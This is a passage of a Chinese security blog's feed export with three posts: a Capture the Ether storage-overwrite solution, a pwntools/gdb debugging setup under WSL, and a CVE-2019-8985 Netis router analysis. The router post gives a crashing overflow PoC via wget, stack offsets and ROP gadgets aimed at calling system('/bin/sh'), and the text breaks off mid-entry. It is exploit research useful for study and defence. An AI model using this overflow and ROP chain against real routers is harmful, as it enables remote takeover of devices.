class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    <span class="type">bool</span> public isComplete;</span><br><span class="line">    uint256[] <span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">set</span><span class="params">(uint256 key, uint256 value)</span> public &#123;</span><br><span class="line">        <span class="comment">// Expand dynamic array as needed</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>.length &lt;= key) &#123;</span><br><span class="line">            <span class="built_in">map</span>.length = key + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">map</span>[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get</span><span class="params">(uint256 key)</span> public view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接到合约</p><p>set 是可以控制下标 那么给 <code>isComplete</code>  覆盖掉就行了 十分清楚<br> map 是可变结构 每个成员是存放在 <code>keccak(padding(1))</code>  依次往上的地方<br>可以打印看到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&#x27;ethers&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs-extra&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> web3 =  <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&quot;your_rpc_url&quot;</span>)</span><br><span class="line">contractAddr = <span class="string">&quot;your_account_addr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">cl</span> = x =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">padding</span>(<span class="params">x</span>) &#123;</span><br><span class="line">x = x.<span class="title function_">toString</span>()</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i %3C (<span class="number">64</span> - x.<span class="property">length</span>); i++) &#123;</span><br><span class="line">s += <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">s += x</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getSlot</span>(<span class="params">idx</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> ret = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddr, idx)</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getShaIdx</span>(<span class="params">idx</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> ret = <span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="title function_">padding</span>(idx))</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title function_">cl</span>(<span class="keyword">await</span> <span class="title function_">getSlot</span>(<span class="number">0</span>))</span><br><span class="line"><span class="title function_">cl</span>(<span class="keyword">await</span> <span class="title function_">getSlot</span>(<span class="number">1</span>))</span><br><span class="line"><span class="title function_">cl</span>(<span class="keyword">await</span> <span class="title function_">getShaIdx</span>(<span class="number">1</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>()</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(err),</span><br><span class="line">process.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">&#125;)&gt;)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure><p>第三个就是我们 map 第一个元素存放的位置<br>用 <code>2**256</code>  减一下就是偏移了</p><p><img src="/2022/08/27/BlockChain-from-scratch-mapping/2.png" alt></p><p><img src="/2022/08/27/BlockChain-from-scratch-mapping/3.png" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://capturetheether.com/challenges/math/mapping/&quot;&gt;Capture the Ether - Mapping&lt;/a&gt;&lt;br&gt;
 从一道题入门 blockchain&lt;/p&gt;
&lt;h2 id=&quot;evm存储简介</summary>
      
    
    
    
    <category term="ctf" scheme="https://squirre17.github.io/categories/ctf/"/>
    
    
    <category term="Blockchain" scheme="https://squirre17.github.io/tags/Blockchain/"/>
    
  </entry>
  
  <entry>
    <title>pwn in WSL Pwsh and Vscode</title>
    <link href="https://squirre17.github.io/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/"/>
    <id>https://squirre17.github.io/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/</id>
    <published>2022-08-16T08:42:50.000Z</published>
    <updated>2022-08-16T08:42:50.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景提要"><a class="markdownIt-Anchor" href="#背景提要">#</a> 背景提要</h2><p>回校后来到实验室 借用了下姚佬的 2k 大屏 发现确实舒服 但是有个致命的问题 键盘输入和显示器显示有明显的延迟<br>但是在主机就没事<br>加上之前也厌烦了在主机和虚拟机之间划来划去 怪麻烦的<br>就想有没有可替代的方案 让我不需要进虚拟机（将其当个远程服务器）<br>就能舒舒服服的做 pwn 题</p><p>然后发现了<a href="https://blog.csome.cc/p/2022CISCN-hn-wp/"> Csome</a> 师傅的博客 是用 powershell 在 wsl 进行的<br>然后我审计了一下 pwntools 的源码<br>确实会启动一个 terminal 进程 将我们输入的参数进去执行<br>在 window 下启动的进程是 <code>cmd.exe</code>  是挂载在 <code>/mnt</code>  目录下<br>但是由于是跨文件系统 打开实在太慢 （window 的程序要访问 linux 进程内部的内存空间 得先从 Linux 切进 window<br> 在 window 上打开 <code>cmd.exe</code>  再切回 Linux）</p><p>因此寻找别的替代方案<br>正好也是 defcon 时期 无聊刷推的时候看到<a href="https://www.youtube.com/watch?v=8QAGLdY6bDw"> DEF CON LiveCTF 2022 - Day 2 - YouTube</a><br> 中间的 winpwn 玩家采取的方法<br>其实也就是 pause 等待进程 attach 罢了 不过这个足以解决我的一切问题</p><h2 id="pwn脚本中定义个函数"><a class="markdownIt-Anchor" href="#pwn脚本中定义个函数">#</a> pwn 脚本中定义个函数</h2><p>举例 这里定义了一个 dbg 函数 可以将我们传入的断点和 set 信息统统写入 <code>/tmp/gdbscript</code>  作为 gdb 启动信息<br>（pwntools 内部就是这么实现的 依葫芦画瓢<br> dft 是预定义的一些信息 比如 <code>set $a=0xdeedbeaf</code>  这些需要每次都写入的就写到 dft 里面去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;Linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./emulator&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./libunicorn.so.1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :p.info(<span class="string">&#x27;======&gt;&#x27;</span>+tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ir      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">sc      = <span class="keyword">lambda</span> s, addr            :success(s + <span class="string">&quot; =&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ps= <span class="keyword">lambda</span> :pause()</span><br><span class="line"></span><br><span class="line">dft = [<span class="string">&quot;b *0x1234&quot;</span>, <span class="string">&quot;b *0x7890000&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=[<span class="string">&quot;&quot;</span>]</span>):</span><br><span class="line">a = dft + s</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/tmp/gdbscript&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x + <span class="string">&#x27;\n&#x27;</span>, a))</span><br><span class="line">f.writelines(a)</span><br><span class="line">f.close()</span><br><span class="line">ps()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">dbg([<span class="string">&quot;b *0xdeedbeaf&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">exp()</span><br><span class="line">ir()</span><br></pre></td></tr></table></figure><h2 id="gdb的启动方式"><a class="markdownIt-Anchor" href="#gdb的启动方式">#</a> gdb 的启动方式</h2><p>执行 py 脚本 pause 挂起后<br>由我们的 powershell 去 attach</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb attach $(pidof procname) -x /tmp/gdbscript</span><br></pre></td></tr></table></figure><p>procname 是程序名</p><p>或者更直接点 写个脚本 <code>pgdb</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">gdb attach $(pidof procname) -x /tmp/gdbscript</span></span><br><span class="line">if [ $# -ne 1 ];then</span><br><span class="line">echo &quot;usage : pgdb procname&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">pid=`pidof $1`</span><br><span class="line">gdb attach $pid -x /tmp/gdbscript</span><br></pre></td></tr></table></figure><p>只需要 <code>pgdb procname</code>  就能 attach 了</p><h2 id="工作流"><a class="markdownIt-Anchor" href="#工作流">#</a> 工作流</h2><p>vscode 写 exp<br>vscode terminal 进行 exp 的执行（最喜欢的 terminal<br>powershell 进行 gdb<br><img src="/2022/08/16/pwn-in-WSL-Pwsh-and-Vscode/20220816164008.png" alt="Pasted image 20220816164008"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;背景提要&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#背景提要&quot;&gt;#&lt;/a&gt; 背景提要&lt;/h2&gt;
&lt;p&gt;回校后来到实验室 借用了下姚佬的 2k 大屏 发现确实舒服 但是有个致命的问题 键盘输入和显示器显示有明显的延迟&lt;br&gt;
但是在主</summary>
      
    
    
    
    <category term="Tips" scheme="https://squirre17.github.io/categories/Tips/"/>
    
    
    <category term="Tips" scheme="https://squirre17.github.io/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>CVE–2019–8985 Netis WF2411 RCE detail</title>
    <link href="https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/"/>
    <id>https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/</id>
    <published>2021-08-10T16:00:00.000Z</published>
    <updated>2021-08-10T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建">#</a> 环境搭建</h2><p>固件获取  <a href="https://www.netis-systems.com/Suppory/de_details/id/1/de/168.html">WF2419</a><br><a href="https://www.tacnetsol.com/blog/cve-2019-8985-rce">Fetching Title#sw0w</a><br> 选择 WF2419（2.2.36123）</p><p>先逆向分析 <code>boa</code> <br> 漏洞点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">loc_4145D8:              <span class="meta"># s</span></span><br><span class="line">addiu   $a0, $sp, <span class="number">0x60</span>+var_40</span><br><span class="line">li      $a1, <span class="number">0x420000</span></span><br><span class="line">nop</span><br><span class="line">addiu   $a1, (aSS_0 - <span class="number">0x420000</span>)  # <span class="string">&quot;%s:%s&quot;</span></span><br><span class="line">move    $a2, $s0</span><br><span class="line">move    $a3, $s4</span><br><span class="line">la      $t9, <span class="built_in">sprintf</span></span><br><span class="line">nop</span><br><span class="line">jalr    $t9 ; <span class="built_in">sprintf</span></span><br><span class="line">nop</span><br><span class="line">lw      $gp, <span class="number">0x60</span>+var_48($sp)</span><br><span class="line">nop</span><br><span class="line">li      $s3, <span class="number">0x460000</span></span><br><span class="line">nop</span><br><span class="line">addiu   $s3, (byte_4596D0 - <span class="number">0x460000</span>)</span><br><span class="line">lbu     $v0, <span class="number">0x60</span>+var_40($sp)</span><br><span class="line">nop</span><br><span class="line">addiu   $s2, $v0, <span class="number">-0x3A</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">user_ok</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// dc</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">64</span>]; <span class="comment">// [sp+20h] [-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( get_password(<span class="number">64</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(v10, <span class="string">&quot;%s:%s&quot;</span>, a1, a2);</span><br><span class="line">    v6 = (<span class="type">unsigned</span> __int8)v10[<span class="number">0</span>] - <span class="number">58</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v4 &lt;&lt; <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">if</span> ( byte_4596D0[<span class="number">64</span> * v4] == <span class="number">58</span> &amp;&amp; !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v8 = &amp;byte_4596D0[v7];</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;byte_4596D0[v7]) &gt;= <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="built_in">strcmp</span>(v10, v8) == <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;check password error,log_passwd=%s;passwd=%s\n&quot;</span>, a2, byte_4596D0);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s:%s:%d;get password error!\n&quot;</span>, <span class="string">&quot;htauth.c&quot;</span>, <span class="string">&quot;user_ok&quot;</span>, <span class="number">74</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动 boa 的时候可以检查下配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  sqrootfs file bin/busybox         </span><br><span class="line">bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">➜  sqrootfs cp $(which qemu-mips) .</span><br><span class="line">➜  sqrootfs grep -r &quot;boa -&quot; .                   </span><br><span class="line">./bin/webs:/bin/boa -p /web -f /etc/boa.conf &amp;</span><br><span class="line">grep: ./var/run/webs.pid: Permission denied</span><br><span class="line">➜  sqrootfs sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br><span class="line">[sudo] password for squ: </span><br><span class="line">Starting Protocol Module: HTTP Server                      ... OK</span><br></pre></td></tr></table></figure><p>如果出现不能缺失 <code>/dev/null</code>  的问题<br>可以 <code>sudo mknod -m 666 dev/null c 1 3</code> <br> 如果出现 <code>can't create PID file</code> <br> 可以 <code>md var/run</code></p><p>然后可以打个 PoC 试试看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --http-user=a --http-password=$(python -c &#x27;print &quot;a&quot;*0x80&#x27;) http://127.0.0.1</span><br></pre></td></tr></table></figure><p>可以看到报错信息如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">translate_uri:222;Wget/1.19.4 (linux-gnu)</span><br><span class="line">translate_uri:254</span><br><span class="line">translate_uri:256</span><br><span class="line">htauth.c:user_auth:181;get password error!</span><br></pre></td></tr></table></figure><p>✨TODO</p><p>逆向一下可以发现要打开一个 passwd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2 = fopen(<span class="string">&quot;/tmp/passwd&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br></pre></td></tr></table></figure><p>cp 本地的过去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/passwd ./tmp</span><br></pre></td></tr></table></figure><p>在 wget 一下 可以看到崩溃</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">check password error,log_passwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;passwd=root:x:0:0:root:/root:/bin/bash</span><br><span class="line">caught SIGSEGV, dumping core in /var/boa</span><br><span class="line">qemu: uncaught target signal 6 (Aborted) - core dumped</span><br><span class="line">[1]    49014 abort      sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h2><p><code>ra</code>  在  <code>sp + 0x14</code> <br> <code>buf</code>  在  <code>sp - 0x40</code> <br> 也就是 <code>0x54</code>  的 offs<br> 同时我们也需要控制五个寄存器 <code>s0 ~ s5</code>  这五个调用者保存寄存器<br>这些寄存器主要是为了劫持返回地址 因为会有 sx 传递给 ax<br> 然后 jalr ax 的 gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004146</span>DC                 lw      $ra, <span class="number">0x60</span>+var_s14($sp)</span><br><span class="line">.text:<span class="number">004146E0</span>                 lw      $s4, <span class="number">0x60</span>+var_s10($sp)</span><br><span class="line">.text:<span class="number">004146E4</span>                 lw      $s3, <span class="number">0x60</span>+var_sC($sp)</span><br><span class="line">.text:<span class="number">004146E8</span>                 lw      $s2, <span class="number">0x60</span>+var_s8($sp)</span><br><span class="line">.text:<span class="number">004146</span>EC                 lw      $s1, <span class="number">0x60</span>+var_s4($sp)</span><br><span class="line">.text:<span class="number">004146F</span>0                 lw      $s0, <span class="number">0x60</span>+var_s0($sp)</span><br><span class="line">.text:<span class="number">004146F</span>4                 jr      $ra</span><br><span class="line">.text:<span class="number">004146F</span>8                 addiu   $sp, <span class="number">0x78</span></span><br></pre></td></tr></table></figure><p>sprintf 的逆向语句如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(dest, &quot;%s:%s&quot;, username, password);</span><br></pre></td></tr></table></figure><p><code>boa</code>  has two loaded libraries,  <code>libC</code>  and  <code>libgcc</code> .</p><p>审视一波 libc.so.0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Python&gt;</span><span class="language-bash">mipsrop.stackfinder()</span></span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x000068AC  |  addiu $a0,$sp,0x20+var_8                            |  jalr  $v0                             |</span><br><span class="line">|  0x0000711C  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class="line">|  0x000074BC  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class="line">|  0x00020660  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class="line">|  0x000071E4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x00008AD4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0000A3CC  |  addiu $a2,$sp,0x40+var_28                           |  jr    0x40+var_sC($sp)                |</span><br><span class="line">|  0x000125E0  |  addiu $a2,$sp,0x18+arg_8                            |  jr    0x18+var_s0($sp)                |</span><br></pre></td></tr></table></figure><p>没有可用的 gadget<br> 再到 libgcc 中找 第二列有 a0 第三列有 s0 ~ s4 就行<br>找到这个 也就是要确保</p><ul><li>binsh 地址在 sp + 0x18 (但这个是在执行了 <code>addiu   $sp, 0x78</code>  之后的)</li><li>而 system 在 s3 （sp + 0xc）</li><li>ra 在 sp +0x14</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class="line">.text:0000ABD4                 move    $a1, $s2</span><br><span class="line">.text:0000ABD8                 move    $s0, $zero</span><br><span class="line">.text:0000ABDC                 move    $t9, $s3</span><br><span class="line">.text:0000ABE0                 jalr    $t9</span><br><span class="line">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure><p>在 qemu 内模拟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 